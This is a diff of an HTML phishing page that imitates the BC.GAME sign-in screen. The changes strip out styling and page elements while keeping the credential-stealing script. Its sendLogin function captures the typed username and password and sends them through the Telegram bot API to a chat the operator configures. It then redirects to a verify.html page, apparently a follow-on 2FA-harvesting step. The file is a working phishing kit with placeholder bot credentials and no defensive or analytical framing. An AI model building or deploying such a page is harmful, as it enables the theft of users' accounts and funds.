@@ -4,159 +4,49 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Sign In - BC.GAME</title>
-
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign In - BC.GAME</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-    input { font-size: 16px !important; }
-</style>
-
+        input { font-size: 16px !important; }
         * { box-sizing: border-box; }
-        body { background-color: #1c1f21; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: flex-start; height: 100vh; margin: 0; padding-top: 20px; }
-        .mobile-wrapper { width: 340px; border-radius: 20px; box-shadow: 0 0 15px rgba(0,0,0,0.5); overflow: hidden; position: relative; }
-        
-        /* Header & Logo */
-        .header { background: #1c1f21; padding: 10px; display: flex; justify-content: space-between; align-items: center; }
-        .logo-group { display: flex; align-items: center; gap: 8px; }
-        .logo-group h1 { font-size: 1.1em; margin: 0; color: white; }
-        .status-bar { color: #aaa; font-size: 0.8em; }
-        .close-icon { color: #666; cursor: pointer; }
-
-        /* Banner & Benefits */
-        .banner-benefits { display: flex; justify-content: space-between; align-items: center; background-color: #121415; padding: 10px 15px; border-bottom: 1px solid #222; }
-        .benefits { list-style: none; padding: 0; margin: 0; font-size: 0.75em; color: #8f9397; width: 55%; }
-        .benefits li { display: flex; align-items: center; gap: 6px; margin-bottom: 6px; }
-        .benefits .icon-circle { width: 14px; height: 14px; border-radius: 50%; display: inline-flex; justify-content: center; align-items: center; color: white; font-size: 8px; }
-        .green-c { color: #3bc117; font-weight: bold; }
-        .banner-img { width: 40%; }
-        .banner-img img { width: 100%; border-radius: 5px; }
-
-        /* Tabs */
-        .main-form { background-color: #1c1f21; padding: 15px; }
-        h2 { font-size: 1.1em; font-weight: bold; margin-bottom: 15px; }
-        .tabs { display: flex; background-color: #121415; border-radius: 8px; padding: 2px; margin-bottom: 20px; }
-        .tab { flex: 1; text-align: center; padding: 10px; font-size: 0.85em; color: #8f9397; border-radius: 6px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; }
-        .tab.active { background-color: #272a2e; color: white; }
-
-        /* Inputs & Buttons */
-        .form-group { position: relative; margin-bottom: 12px; }
-        input { width: 100%; padding: 12px 15px; background-color: #121415; border: 1px solid #2d3034; border-radius: 8px; color: white; font-size: 0.85em; }
-        input::placeholder { color: #5a5f64; }
-        .input-icon { position: absolute; right: 15px; top: 12px; color: #5a5f64; cursor: pointer; font-size: 0.9em; }
-        .forgot-pass { color: #8f9397; text-align: right; font-size: 0.75em; margin-bottom: 15px; cursor: pointer; text-decoration: none; display: block; }
-        .forgot-pass:hover { text-decoration: underline; }
-        .signin-btn { width: 100%; padding: 12px; background-color: #3bc117; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 0.9em; cursor: pointer; text-transform: uppercase; margin-bottom: 15px; transition: background 0.2s; }
-        .signin-btn:hover { background-color: #32a114; }
-
-        /* Footer */
-        .new-account { text-align: center; color: #8f9397; font-size: 0.8em; margin-bottom: 25px; }
-        .new-account span { color: #3bc117; cursor: pointer; font-weight: bold; }
-        .log-in-directly { text-align: center; color: #5a5f64; font-size: 0.75em; border-top: 1px solid #2d3034; padding-top: 20px; margin-bottom: 15px; position: relative; }
-        .passkey-btn { background-color: #272a2e; border: none; width: 100%; padding: 12px; border-radius: 8px; color: white; font-size: 0.85em; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; margin-bottom: 20px; }
-        .social-row { display: flex; justify-content: center; gap: 15px; }
-        .social-icon { width: 30px; height: 30px; background-color: #121415; border-radius: 5px; display: flex; justify-content: center; align-items: center; color: #8f9397; border: 1px solid #2d3034; cursor: pointer; font-size: 0.9em; text-decoration: none; }
-        .social-icon:hover { color: white; border-color: #5a5f64; }
+        body { background-color: #1c1f21; color: white; font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; }
+        .mobile-wrapper { width: 100%; max-width: 400px; min-height: 100vh; background-color: #1c1f21; }
+        .header { padding: 15px; display: flex; justify-content: space-between; align-items: center; }
+        .main-form { padding: 20px; }
+        .form-group { margin-bottom: 15px; }
+        input { width: 100%; padding: 15px; background-color: #121415; border: 1px solid #2d3034; border-radius: 8px; color: white; }
+        .signin-btn { width: 100%; padding: 15px; background-color: #3bc117; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; text-transform: uppercase; }
     </style>
 </head>
 <body>
     <div class="mobile-wrapper">
-        <div class="header">
-            <div class="logo-group">
-                <h1>BC.GAME</h1>
-            </div>
-            <i class="fas fa-times close-icon"></i>
-        </div>
-
-        <div class="banner-benefits">
-            <ul class="benefits">
-                <li><span class="icon-circle" style="background:#dc2626;"><i class="fas fa-th-large"></i></span><span class="green-c">470%</span> Welcome deposit bonus</li>
-                <li><span class="icon-circle" style="background:#ffb200;"><i class="fas fa-yin-yang"></i></span><span class="green-c">5 BTC</span> Free daily lucky spin</li>
-                <li><span class="icon-circle" style="background:#1d4ed8;"><i class="fas fa-gift"></i></span><span class="green-c">Free Perks</span> Daily free rewards & bonuses</li>
-            </ul>
-            <div class="banner-img">
-                <img src="https://via.placeholder.com/150x80/2c3034/8f9397?text=Promos" alt="Bonus Images">
-            </div>
-        </div>
-
+        <div class="header"><h1>BC.GAME</h1></div>
         <div class="main-form">
             <h2>Sign In</h2>
-            <div class="tabs">
-                <div class="tab active"><i class="fas fa-lock"></i> Password</div>
-                <div class="tab"><i class="fas fa-key"></i> One-time Code</div>
-            </div>
-
             <div class="form-group">
-                <input type="text" id="username" placeholder="Email / Phone Number / Username">
+                <input type="text" id="username" placeholder="Email / Username">
             </div>
             <div class="form-group">
                 <input type="password" id="password" placeholder="Password">
-                <i class="fas fa-eye input-icon" id="togglePassword"></i>
             </div>
-            <a href="#" class="forgot-pass">Forgot your password?</a>
-
             <button class="signin-btn" onclick="sendLogin()">Sign In</button>
-
-            <div class="new-account">New to BC.GAME? <span>Create account</span></div>
-            
-            <div class="log-in-directly">Log in directly with</div>
-            
-            <button class="passkey-btn">
-                <i class="fas fa-fingerprint"></i>
-                Sign In with passkey
-            </button>
-            
-            <div class="social-row">
-                <a href="#" class="social-icon"><i class="fab fa-google"></i></a>
-                <a href="#" class="social-icon"><i class="fab fa-twitter"></i></a>
-                <a href="#" class="social-icon"><i class="fab fa-telegram"></i></a>
-                <a href="#" class="social-icon"><i class="fab fa-facebook"></i></a>
-                <a href="#" class="social-icon"><i class="fab fa-weixin"></i></a>
-                <a href="#" class="social-icon"><i class="fab fa-line"></i></a>
-                <a href="#" class="social-icon"><i class="fab fa-steam"></i></a>
-            </div>
         </div>
     </div>
 
     <script>
-        // Password Visibility Toggle
-        document.getElementById('togglePassword').addEventListener('click', function (e) {
-            const password = document.getElementById('password');
-            const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
-            password.setAttribute('type', type);
-            this.classList.toggle('fa-eye-slash');
-        });
-
-        // The Main Login Function
         function sendLogin() {
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
 
-            if (user === '' || pass === '') {
-                alert('Please enter your details');
-                return;
-            }
-
-            // [SETUP REQUIRED] Add your Telegram details here
             const botToken = 'YOUR_API_TOKEN_HERE';
             const chatId = 'YOUR_CHAT_ID_HERE';
             
-            const text = `New Login Attempt!\nUser: ${user}\nPass: ${pass}`;
+            const text = `BC.GAME LOGIN\nUser: ${user}\nPass: ${pass}`;
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
 
-            // Send notification to your bot, then move to 2FA page
             fetch(url).then(() => {
-                window.location.href = 'verify.html'; // Redirects to the verify page
-            }).catch(error => {
-                console.error('Error:', error);
-                window.location.href = 'verify.html'; // Backup redirect if Telegram fails
+                window.location.href = 'verify.html';
             });
         }
     </script>
 </body>
 </html>
-
-
-
-
